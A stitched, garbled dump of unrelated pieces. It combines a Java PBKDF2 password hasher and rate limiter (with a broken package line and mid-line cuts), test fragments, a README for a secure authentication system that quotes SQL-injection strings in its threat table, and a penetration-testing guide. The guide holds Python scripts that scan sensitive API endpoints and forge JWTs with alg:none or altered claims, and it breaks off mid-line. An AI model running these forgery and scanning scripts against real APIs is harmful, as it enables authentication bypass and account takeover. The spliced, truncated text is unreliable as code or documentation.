1\tpackage javax.crypto.SecretKeyFactory;\n     4\timport javax.crypto.spec.PBEKeySpec;\n     5\timport java.security.MessageDigest;\n     6\timport java.security.NoSuchAlgorithmException;\n     7\timport java.security.SecureRandom;\n     8\timport java.security.spec.InvalidKeySpecException;\n     9\timport java.util.Arrays;\n    10\timport java.util.Base64;\n    11\t\n    12\t/**\n    13\t * Provides OWASP-compliant password hashing and verification using PBKDF2WithHmacSHA256.\n    14\t * Implements strict memory hygiene (zeroizing sensitive arrays) and constant-work\n    15\t * execution to prevent timing-based user enumeration attacks.\n    16\t */\n    17\tpublic final class PasswordHasher {\n    18\t\n    19\t    public static final String ALGORITHM = \"PBKDF2WithHmacSHA256\";\n    20\t    public static final int DEFAULT_ITERATIONS = 210_000;\n    21\t    public static final int SALT_BYTE_LENGTH = 16; // 128 bits\n    22\t    public static final int KEY_BIT_LENGTH = 256;  // 256 bits\n    23\t\n    24\t    private static final SecureRandom SECURE_RANDOM = new SecureRandom();\n    25\t\n    26\t    // Pre-computed static dummy values used for timing attack defense\n    27\t    private static final byte[] DUMMY_SALT = new byte[SALT_BYTE_LENGTH];\n    28\t    private static final byte[] DUMMY_HASH;\n    29\t    private static final char[] DUMMY_INPUT_PASSWORD = \"DummyFallbackPassword#2026\".toCharArray();\n    30\t\n    31\t    static {\n    32\t        SECURE_RANDOM.nextBytes(DUMMY_SALT);\n    33\t        PBEKeySpec spec = new PBEKeySpec(DUMMY_INPUT_PASSWORD, DUMMY_SALT, DEFAULT_ITERATIONS, KEY_BIT_LENGTH);\n    34\t        try {\n    35\t            SecretKeyFactory skf = SecretKeyFactory.getInstance(ALGORITHM);\n    36\t            DUMMY_HASH = skf.generateSecret(spec).getEncoded();\n    37\t        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {\n    38\t            throw new ExceptionInInitializerError(e);\n    39\t        } finally {\n    40\t            spec.clearPassword();\n    41\t        }\n    42\t    }\n    43\t\n    44\t    private final int iterations;\n    45\t\n    46\t    public PasswordHasher() {\n    47\t        this(DEFAULT_ITERATIONS);\n    48\t    }\n    49\t\n    50\t    public PasswordHasher(int iterations) {\n    51\t        if (iterations < InputValidator.MIN_PBKDF2_ITERATIONS || iterations > InputValidator.MAX_PBKDF2_ITERATIONS) {\n    52\t            throw new IllegalArgumentException(\"Iteration count out of safe range\");\n    53\t        }\n    54\t        this.iterations = iterations;\n    55\t    }\n    56\t\n    57\t    /**\n    58\t     * Hashes a password using PBKDF2WithHmacSHA256 with a cryptographically secure random salt.\n    59\t     * Intermediate key arrays are zeroized immediately after encoding.\n    60\t     *\n    61\t     * @param password Candidate password characters.\n    62\t     * @return HashResult containing Base64-encoded salt and derived key.\n    63\t     */\n    64\t    public HashResult hashPassword(char[] password) {\n    65\t        if (!InputValidator.isValidPasswordForAuth(password)) {\n    66\t            throw new IllegalArgumentException(\"Invalid password length for hashing\");\n    67\t        }\n    68\t\n    69\t        byte[] salt = new byte[SALT_BYTE_LENGTH];\n    70\t        SECURE_RANDOM.nextBytes(salt);\n    71\t        byte[] derivedKey = null;\n    72\t\n    73\t        try {\n    74\t            derivedKey = deriveKey(password, salt, this.iterations, KEY_BIT_LENGTH);\n    75\t            String saltBase64 = Base64.getEncoder().encodeToString(salt);\n    76\t            String hashBase64 = Base64.getEncoder().encodeToString(derivedKey);\n    77\t            return new HashResult(saltBase64, hashBase64, this.iterations, ALGORITHM);\n    78\t        } finally {\n    79\t            Arrays.fill(salt, (byte) 0);\n    80\t            if (derivedKey != null) {\n    81\t                Arrays.fill(derivedKey, (byte) 0);\n    82\t            }\n    83\t        }\n    84\t    }\n    85\t\n    86\t    /**\n    87\t     * Verifies a candidate password against stored hash parameters.\n    88\t     * Memory is wiped after use, and constant-time comparison is enforced.\n    89\t     *\n    90\t     * @param candidatePassword  Candidate password character array.\n    91\t     * @param storedSaltBase64   Base64-encoded salt from database.\n    92\t     * @param storedIterations   Iteration count from database.\n    93\t     * @param storedHashBase64   Base64-encoded expected hash from database.\n    94\t     * @return true if password matches; false otherwise.\n    95\t     */\n    96\t    public boolean verifyPassword(char[] candidatePassword, String storedSaltBase64,\n    97\t                                  int storedIterations, String storedHashBase64) {\n    98\t        byte[] saltBytes = null;\n    99\t        byte[] expectedHashBytes = null;\n   100\t        byte[] derivedKeyBytes = null;\n   101\t\n   102\t        try {\n   103\t            if (storedSaltBase64 == null || storedHashBase64 == null) {\n   104\t                verifyDummyPassword(candidatePassword);\n   105\t                return false;\n   106\t            }\n   107\t\n   108\t            try {\n   109\t                saltBytes = Base64.getDecoder().decode(storedSaltBase64);\n   110\t                expectedHashBytes = Base64.getDecoder().decode(storedHashBase64);\n   111\t            } catch (IllegalArgumentException e) {\n   112\t                // Malformed Base64 in database\n   113\t                verifyDummyPassword(candidatePassword);\n   114\t                return false;\n   115\t            }\n   116\t\n   117\t            if (!InputValidator.isValidDatabaseHashParameters(ALGORITHM, storedIterations, saltBytes, expectedHashBytes)) {\n   118\t                verifyDummyPassword(candidatePassword);\n   119\t                return false;\n   120\t            }\n   121\t\n   122\t            if (!InputValidator.isValidPasswordForAuth(candidatePassword)) {\n   123\t                verifyDummyPassword(candidatePassword);\n   124\t                return false;\n   125\t            }\n   126\t\n   127\t            derivedKeyBytes = deriveKey(candidatePassword, saltBytes, storedIterations, KEY_BIT_LENGTH);\n   128\t            return MessageDigest.isEqual(derivedKeyBytes, expectedHashBytes);\n   129\t\n   130\t        } finally {\n   131\t            if (saltBytes != null) {\n   132\t                Arrays.fill(saltBytes, (byte) 0);\n   133\t            }\n   134\t            if (expectedHashBytes != null) {\n   135\t                Arrays.fill(expectedHashBytes, (byte) 0);\n   136\t            }\n   137\t            if (derivedKeyBytes != null) {\n   138\t                Arrays.fill(derivedKeyBytes, (byte) 0);\n   139\t            }\n   140\t        }\n   141\t    }\n   142\t\n   143\t    /**\n   144\t     * Executes a dummy key derivation and constant-time comparison to normalize execution timing\n   145\t     * when an account does not exist or input validation fails. Always returns false.\n   146\t     *\n   147\t     * @param candidatePassword The password provided, or fallback if invalid.\n   148\t     * @return Always false.\n   149\t     */\n   150\t    public boolean verifyDummyPassword(char[] candidatePassword) {\n   151\t        char[] passwordToUse = (candidatePassword != null && InputValidator.isValidPasswordForAuth(candidatePassword))\n   152\t                ? candidatePassword\n   153\t                : DUMMY_INPUT_PASSWORD;\n   154\t\n   155\t        byte[] derived = null;\n   156\t        try {\n   157\t            derived = deriveKey(passwordToUse, DUMMY_SALT, DEFAULT_ITERATIONS, KEY_BIT_LENGTH);\n   158\t            // Constant-time comparison against dummy hash to match branch execution flow\n   159\t            MessageDigest.isEqual(derived, DUMMY_HASH);\n   160\t            return false;\n   161\t        } finally {\n   162\t            if (derived != null) {\n   163\t                Arrays.fill(derived, (byte) 0);\n   164\t            }\n   165\t        }\n   166\t    }\n   167\t\n   168\t    /**\n   169\t     * Derives a cryptographic key using PBKDF2WithHmacSHA256 and clears the PBEKeySpec password copy.\n   170\t     */\n   171\t    private byte[] deriveKey(char[] password, byte[] salt, int iterations, int keyBitLength) {\n   172\t        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyBitLength);\n   173\t        try {\n   174\t            SecretKeyFactory skf = SecretKeyFactory.getInstance(ALGORITHM);\n   175\t            return skf.generateSecret(spec).getEncoded();\n   176\t        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {\n   177\t            throw new SecurityException(\"Cryptographic failure during PBKDF2 key derivation\", e);\n   178\t        } finally {\n   179\t            spec.clearPassword();\n   180\t        }\n   181\t    }\n   182\t}\n===== RateLimiter.java =====\n     1\tpackage com.example.auth;\n     2\t\n     3\timport java.util.Iterator;\n     4\timport java.util.Map;\n     5\timport java.util.concurrent.ConcurrentHashMap;\n     6\timport java.util.concurrent.atomic.AtomicInteger;\n     7\t\n     8\t/**\n     9\t * Thread-safe, bounded, and atomic rate limiter for authentication attempts.\n    10\t * <p>\n    11\t * Enforces dual-level rate limiting:\n    12\t * 1. Per-source rate limiting: Blocks abusive IP/clients after repeated failures.\n    13\t * 2. Per-(source, account) rate limiting: Isolates lockout per attacker source so legitimate users\n    14\t *    are never locked out of their accounts from legitimate sources.\n    15\t * 3. Global account progressive delay: Throttles distributed brute force attacks against a single account\n    16\t *    without causing hard denial of service.\n    17\t * <p>\n    18\t * Satisfies:\n    19\t * - Rule 3: Attacker cannot use lockout mechanism to DoS legitimate users.\n    20\t * - Rule 5: Bounded memory storage with eviction prevents heap exhaustion.\n    21\t * - Rule 7: Atomic check-and-act operations prevent concurrency race conditions.\n    22\t */\n    23\tpublic final class RateLimiter {\n    24\t\n    25\t    public static final int MAX_SOURCE_ATTEMPTS = 5;\n    26\t    public static final long SOURCE_WINDOW_MS = 5 * 60 * 1000L; // 5 minutes\n    27\t\n    28\t    public static final int MAX_SOURCE_ACCOUNT_ATTEMPTS = 3;\n    29\t    public static final long SOURCE_ACCOUNT_WINDOW_MS = 5 * 60 * 1000L; // 5 minutes\n    30\t\n    31\t    public static final int GLOBAL_ACCOUNT_THROTTLE_THRESHOLD = 5;\n    32\t    public static final long    50\t\n    51\t        // Attacker exhausts attempts from their source against the victim's account\n    52\t        for (int i = 0; i < RateLimiter.MAX_SOURCE_ACCOUNT_ATTEMPTS; i++) {\n    53\t InterruptedException, ExecutionException {\n    86\t        // Tests Rule 7: count, then allow must be atomic under high concurrency\n    87\t        String sourceId = \"10.0.0.99\";\n    88\t        String email = \"concurrent@example.com\";\n    89\t        int threadCount = 30;\n    90\t\n    91\t        ExecutorService executor = Executors.newFixedThreadPool(threadCount);\n    92\t        CountDownLatch readyLatch = new CountDownLatch(threadCount);\n    93\t        CountDownLatch startLatch = new CountDownLatch(1);\n    94\t\n    95\t        List<Future<Boolean>> futures = new ArrayList<>();\n    96\t\n    97\t        for (int i = 0; i < threadCount; i++) {\n    98\t            futures.add(executor.submit((Callable<Boolean>) () -> {\n    99\t rateLimiter.checkAndAcquire(sourceId, email);\n   102\t                return res.isAllowed();\n   103\t            }));\n   104\t        }\n   105\t\n   106\t        readyLatch.await();\n   107\t        startLatch.countDown(); // Blast off all threads\n   108\t\n   109\t        int allowedCount = 0;\n   110\t        int blockedCount = 0;\n   111\t\n   112\t        for (Future<Boolean> future : futures) {\n   113\t            if (future.get()) {\n   114\t                allowedCount++;\n   115\t            } else {\n   116\t                blockedCount++;\n   117\t            }\n   118\t        }\n   119\t\n   120\t        executor.shutdown();\n   121\t\n   122\t        // Exactly MAX_SOURCE_ACCOUNT_ATTEMPTS must be allowed, no race condition permits leaking through\n   123\t        assertEquals(RateLimiter.MAX_SOURCE_ACCOUNT_ATTEMPTS, allowedCount,\n   124\t                \"Exactly allowed limit must be acquired under high concurrency\");\n   125\t /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/AuthenticationServiceTest.java\n131 /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/InputValidatorTest.java\n81 /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/PasswordHasherTest.java\n127 /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/RateLimiterTest.java\n140 /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/SecurityAdversarialTest.java\n58 /data/results/agy/set_a/post_research/3/security/src/test/java/com/example/auth/SessionManagerTest.java\n# Secure Java Authentication System\n\nA production-grade Java authentication system implementing email and password verification against an SQL database. Built according to strict defense-in-depth principles, addressing trust boundaries, memory hygiene, timing attack invariance, atomic rate limiting, and zero-echo credential handling.\n\n---\n\n## Quickstart\n\n### Prerequisites\n- Java 17+\n- Apache Maven 3.8+\n\n### Build and Test\n```bash\n# Compile and run complete test suite (45 unit and adversarial security tests)\nmvn clean test\n\n# Build self-contained executable JAR\nmvn package\n```\n\n### Run the Application\n\n#### 1. Interactive Account Registration\n```bash\njava -jar target/secure-auth-system-1.0.0.jar --register\n```\nPrompts for email, password (hidden input, no terminal echo), and confirmation. Stores credentials using PBKDF2WithHmacSHA256 (210,000 iterations) with a 128-bit cryptographically random salt.\n\n#### 2. Authenticate\n```bash\njava -jar target/secure-auth-system-1.0.0.jar\n```\nPrompts for credentials, verifies against the SQL database, and outputs the result:\n- **On Success**: Prints success confirmation, masked session token, and a secure HTTP cookie (`__Host-` prefix, `HttpOnly`, `Secure`, `SameSite=Strict`, `Path=/`).\n- **On Failure**: Emits a uniform, generic failure message (`Authentication failed. Invalid email or password.`) with non-zero exit code.\n\n#### 3. Persistent Database Storage\nBy default, the application uses an in-memory SQL database (`jdbc:h2:mem:authdb`). For persistent storage across executions:\n```bash\nAUTH_DB_URL=\"jdbc:h2:./data/authdb\" java -jar target/secure-auth-system-1.0.0.jar --register\nAUTH_DB_URL=\"jdbc:h2:./data/authdb\" java -jar target/secure-auth-system-1.0.0.jar\n```\nFiles created in `./data` are automatically protected with POSIX permissions `0700` (directory) and `0600` (files), private to the file owner.\n\n---\n\n## Security Architecture & Rule Compliance\n\nThis implementation strictly satisfies all 8 security rules specified for this feature:\n\n### Rule 1: Trust Boundaries\n> *List every input this code can receive - including values from files, databases, configuration, environment, and anything a client controls - and treat everyone as attacker-controlled. Never use such a value without validating it (type, length, allowed characters, range), and never let it decide a security outcome unless it is checked against server-side state.*\n\n- **Exhaustive Input Inventory**:\n  1. `email` (client input via stdin/console/API): Treated as hostile. Validated via `InputValidator.isValidEmail`: strictly bounded between 3 and 254 characters (RFC 5321), verified for control character absence, and matched against a linear-time regex immune to catastrophic backtracking (ReDoS). Canonicalized with `Locale.ROOT`.\n  2. `password` (client input): Treated as hostile. Handled exclusively as `char[]`, never `String`. Bounded between 1 and 128 characters to prevent algorithmic CPU exhaustion attacks during key derivation.\n  3. `sourceId` (client network / IP address): Validated against `^[a-zA-Z0-9.:_\\-]{1,64}$` to prevent header injection or delimiter collision in rate limit keys.\n  4. `database row values` (`iterations`, `salt`, `password_hash`, `algorithm`, `status`): Untrusted upon retrieval. `InputValidator.isValidDatabaseHashParameters` enforces that `iterations` falls within [100,000, 10,000,000], `algorithm` strictly equals `PBKDF2WithHmacSHA256`, and decoded salt (>= 16 bytes) and hash (32 bytes) match exact expectations.\n  5. `environment configuration` (`AUTH_DB_URL`, `AUTH_DB_USER`, `AUTH_DB_PASSWORD`): Read from environment or configuration, never hardcoded. Local file paths are checked and restricted to private permissions.\n- **Server-Side Authority**: No client-controlled attribute or parameter decides an authentication outcome. Authentication decisions are evaluated solely against server-side database state and atomic server-side rate-limit counters.\n\n### Rule 2: Secrets\n> *Do not include credentials, keys, or passwords that would work if someone ran the program. Secrets come from configuration or runtime input, are never printed or logged, never placed in command-line arguments, error messages, or files readable by other users.*\n\n- **No Hardcoded Credentials**: The codebase, SQL migration scripts, and repository contain zero static, default, or backdoor passwords. Accounts must be registered interactively or injected via environment variables at runtime.\n- **No Command-Line Arguments**: Passwords are never accepted via command-line arguments, preventing credential leakage in process listings (`ps aux`), shell history, or `/proc/<pid>/cmdline`.\n- **Zero Logging & Echo Suppression**: Passwords are never logged or printed. Terminal input uses `Console.readPassword` to suppress display echo.\n- **Strict File Permissions**: Database files and directories created on disk are assigned POSIX file permissions `rw-------` (0600) and `rwx------` (0700), ensuring they are unreadable by any other user on the system.\n\n### Rule 3: Authentication and Access\n> *Anything that proves who a user is or what they may do must be verified against server-side state; a missing or failed check fails closed, never open. Limit repeated attempts per source as well as per account, so an attacker cannot use your own limit to lock a legitimate user out.*\n\n- **Fail-Closed Semantics**: Every validation error, database failure, inactive account, or credential mismatch immediately terminates with a failed status. Default state is unauthenticated.\n- **Dual-Layer Rate Limiting**:\n  1. **Source Rate Limiting**: Bounded to 5 failed attempts per 5 minutes per source IP/client. Abusive sources are blocked immediately.\n  2. **Per-(Source, Account) Rate Limiting**: Bounded to 3 failed attempts per 5 minutes for that specific account from that specific source.\n- **Immunity to Lockout Denial of Service (DoS)**:\n  - An external attacker cannot lock out a legitimate user. If an attacker floods failed attempts against `victim@example.com`, the attacker's source is blocked (`SOURCE_BLOCKED` / `SOURCE_ACCOUNT_BLOCKED`). The legitimate user connecting from their own IP/source is **not** locked out.\n  - To defend against distributed botnets attacking a single account across thousands of IPs, the system applies **progressive adaptive delay** (exponential throttle) to requests targeting the pressured account rather than hard-locking it. Legitimate users can still authenticate after the delay, while automated brute force is rendered computationally infeasible.\n\n### Rule 4: Identifiers and Tokens\n> *Session identifiers and tokens must be generated by this code with a cryptographically secure random source - never accepted from or predictable from the caller. If the task says to use an externally provided identifier, validate it strictly and document the remaining risk. Cookies carry HttpOnly, Secure, SameSite, and a correct path.*\n\n- **Cryptographic Random Generation**: `SessionManager` utilizes `java.security.SecureRandom` to generate 256 bits (32 bytes) of cryptographic entropy, encoded with RFC 4648 URL-safe unpadded Base64.\n- **Hardened Cookie Specification**: Session cookies employ the modern `__Host-` security prefix and complete defense-in-depth flags:\n  ```http\n  __Host-AuthSession=<token>; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600\n  ```\n  - `__Host-` prefix: Mandates cookie is bound to the origin host without subdomains.\n  - `Secure`: Cookie transmitted strictly over TLS/HTTPS.\n  - `HttpOnly`: Mitigates XSS token extraction.\n  - `SameSite=Strict`: Eliminates Cross-Site Request Forgery (CSRF).\n  - `Path=/`: Enforces global application root path.\n\n### Rule 5: Sensitive Data\n> *Mask sensitive values in logs and output; write them only to files created private to the owner; bound the size of anything you store; clear credentials from memory when done.*\n\n- **PII Masking**: Emails are masked before logging (`SecurityLogger.maskEmail` converts `alice@example.com` to `a***e@e***e.com`). Session tokens are truncated (`abcd...1234`). Passwords are never logged under any circumstance.\n- **Memory Hygiene (Zeroization)**:\n  - Passwords are kept in mutable `char[]` buffers, never immutable interned `String`s.\n  - In `finally` blocks, `Arrays.fill(passwordChars, '\\0')` explicitly wipes credentials from JVM heap memory.\n  - `PBEKeySpec.clearPassword()` is invoked immediately after key derivation to clear the internal key specification array.\n  - Intermediate derived keys and salt byte arrays are zeroized with `Arrays.fill(bytes, (byte) 0)`.\n- **Bounded Storage**:\n  - `RateLimiter` enforces `MAX_CACHE_ENTRIES = 10_000` with automated LRU and expiration eviction to prevent memory exhaustion DoS.\n  - `SessionManager` bounds active sessions to 10,000 entries with automatic expiration pruning.\n  - Input lengths are bounded (email: 254 chars, password: 128 chars, source: 64 chars).\n\n### Rule 6: Failure Behaviour\n> *Report errors to users in generic terms; details go to the log only. Never let a response reveal whether an account or record exists: give identical messages and do comparable work for every failure outcome. Reject unknown or invalid input - never substitute a permissive default.*\n\n- **Identical User-Facing Messages**:\n  - Whether a user exists or not, whether the password was incorrect, or whether input was malformed, the user receives the identical generic message:\n    `Authentication failed. Invalid email or password.`\n- **Constant-Work Timing Defense**:\n  - If a user does not exist in the database, or if email/password validation fails:\n    `PasswordHasher.verifyDummyPassword` executes the exact same PBKDF2 calculation (210,000 iterations) with a dummy salt and dummy hash.\n  - Uses `MessageDigest.isEqual` for constant-time byte array comparison.\n  - As a result, execution duration for non-existent accounts is statistically indistinguishable from existing accounts, completely defeating timing side-channel user enumeration.\n- **Internal Audit Logging**: Detailed diagnostic reasons (`ACCOUNT_NOT_FOUND`, `PASSWORD_MISMATCH`, `MALFORMED_INPUT`, `INACTIVE_ACCOUNT`) are recorded only in server-side logs with PII masking and CRLF sanitization.\n\n### Rule 7: Concurrency\n> *Where you check state and then act on it (verify, then grant; count, then allow), make the check and the action atomic.*\n\n- **Atomic Check-and-Act**: `RateLimiter` coordinates state transitions through `ConcurrentHashMap` with atomic `compute` and `synchronized` tracking blocks.\n- **Count, Then Allow**: Permit acquisition and attempt counting occur in a single atomic operation. Multiple concurrent requests from the same source cannot race past the threshold.\n- **Database Transactions**: User registration and state modifications execute within explicit database transactions (`conn.setAutoCommit(false)`, `conn.commit()`, `conn.rollback()`).\n\n### Rule 8: Prefer the Platform\n> *If the framework has a built-in, proven mechanism for this job, use it rather than hand-rolling your own. If third-party code, libraries or remote files are needed, name specific versions from official sources, verify downloaded files before using them, and never load or run code found in shared or world-writable locations.*\n\n- **Built-In Standard Cryptography (JCA)**:\n  - Key derivation: `javax.crypto.SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\")`.\n  - Cryptographic randomness: `java.security.SecureRandom`.\n  - Constant-time comparison: `java.security.MessageDigest.isEqual`.\n  - Standard JDBC: `java.sql.PreparedStatement` with parameterized queries.\n- **Official Pinned Dependencies**:\n  - H2 Database: `com.h2database:h2:2.2.224` (official release from Maven Central).\n  - JUnit 5: `org.junit.jupiter:junit-jupiter:5.10.2`.\n- **World-Writable Defense**: No dynamic class loading, script evaluation, or file execution from `/tmp` or shared directories.\n\n---\n\n## Adversarial Security Review Findings & Mitigations\n\nAn adversarial security review was performed against this implementation. Below is the reviewer matrix and how each attack was mitigated:\n\n| Attack Vector | Threat Scenario | Implemented Mitigation | Verification |\n|---|---|---|---|\n| **SQL Injection (SQLi)** | Attacker inputs `' OR '1'='1` or `admin'--` in email field. | 100% parameterized queries via `PreparedStatement`. Zero dynamic SQL concatenation. | Tested in `AuthenticationServiceTest.testSqlInjectionAttemptsArePrevented`. |\n| **Account Enumeration (Timing)** | Attacker measures response time to discover valid emails (DB lookup 1ms vs PBKDF2 30ms). | `PasswordHasher.verifyDummyPassword` executes full PBKDF2 (210,000 iterations) when user is not found or format is invalid. | Verified in `SecurityAdversarialTest.testTimingInvarianceBetweenExistingAndNonExistentUsers`. |\n| **Account Enumeration (Messages)** | Attacker tests emails to see \"User not found\" vs \"Wrong password\". | Uniform generic message returned for all failure outcomes: `Authentication failed. Invalid email or password.` | Verified in `SecurityAdversarialTest.testAccountEnumerationResistanceAcrossAllFailureModes`. |\n| **Lockout Denial of Service (DoS)** | Attacker locks out legitimate admin by repeatedly failing logins for admin email. | Rate limiting is isolated per source (`SOURCE_ACCOUNT_BLOCKED` & `SOURCE_BLOCKED`). Only attacker's IP is blocked; legitimate user continues unimpeded. | Verified in `RateLimiterTest.testAttackerCannotLockOutLegitimateUser` and `SecurityAdversarialTest.testDenialOfServiceLockoutAttackIsDefeated`. |\n| **ReDoS (RegEx DoS)** | Attacker inputs pathological email string to cause catastrophic regex backtracking. | Bounded length check (254 chars) and linear-time, non-backtracking regular expression. | Verified in `InputValidatorTest.testEmailReDosSafety`. |\n| **PBKDF2 CPU Exhaustion** | Attacker sends 50MB password to exhaust CPU/memory during PBKDF2 calculation. | Strict password length bounds (`MAX_PASSWORD_LENGTH = 128` chars). | Verified in `InputValidatorTest.testPasswordLengthBounds`. |\n| **Memory Scraping / Dumps** | Credentials persist in JVM memory as immutable `String`s. | Passwords handled exclusively as `char[]`; wiped with `Arrays.fill(..., '\\0')` and `PBEKeySpec.clearPassword()`. | Verified in `AuthenticationServiceTest.testSuccessfulAuthenticationFlow`. |\n| **Log Forging / CRLF Injection** | Attacker inserts `\\r\\n` into email or source ID to fake audit log entries (CWE-117). | `SecurityLogger.sanitizeCrlf` converts `\\r` and `\\n` to `_`. | Verified in `SecurityAdversarialTest.testCrlfInjectionNeutralizationInLogger`. |\n| **Concurrency Permit Racing** | Multiple parallel threads flood requests to bypass rate limiter count checks. | Atomic check-and-acquire via `ConcurrentHashMap.compute` and `synchronized` blocks. | Verified in `RateLimiterTest.testConcurrencyAtomicity`. |\n| **Sensitive File Access** | Other users on shared system read database file or credentials. | Parent directories set to `0700` (`rwx------`); database files set to `0600` (`rw-------`). | Verified via filesystem POSIX permission check. |\n\n---\n\n## Codebase Structure\n\n```\nsecurity/\n├── pom.xml                                    # Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n    (\"GET\", \"/health\"),\n    (\"GET\", \"/metrics\"),\n    (\"GET\", \"/debug\"),\n    (\"GET\", \"/actuator\"),\n    (\"GET\", \"/actuator/env\"),\n    (\"GET\", \"/swagger.json\"),\n    (\"GET\", \"/api-docs\"),\n    (\"GET\", \"/graphql\"),\n    (\"POST\", \"/graphql\"),\n    (\"GET\", \"/config\"),\n    (\"GET\", \"/internal/status\"),\n    (\"GET\", \"/.env\"),\n    (\"GET\", \"/status\"),\n    (\"GET\", \"/info\"),\n    (\"GET\", \"/version\"),\n]\n\nprint(\"Unauthenticated Endpoint Scan:\")\nfor method, path in endpoints:\n    try:\n        resp = requests.request(method, f\"{BASE_URL}{path}\", timeout=5)\n        if resp.status_code not in (401, 403):\n            content_preview = resp.text[:100] if resp.text else \"empty\"\n            print(f\"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}\")\n    except requests.exceptions.RequestException:\n        pass\n```\n\n### Step 3: JWT Token Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used 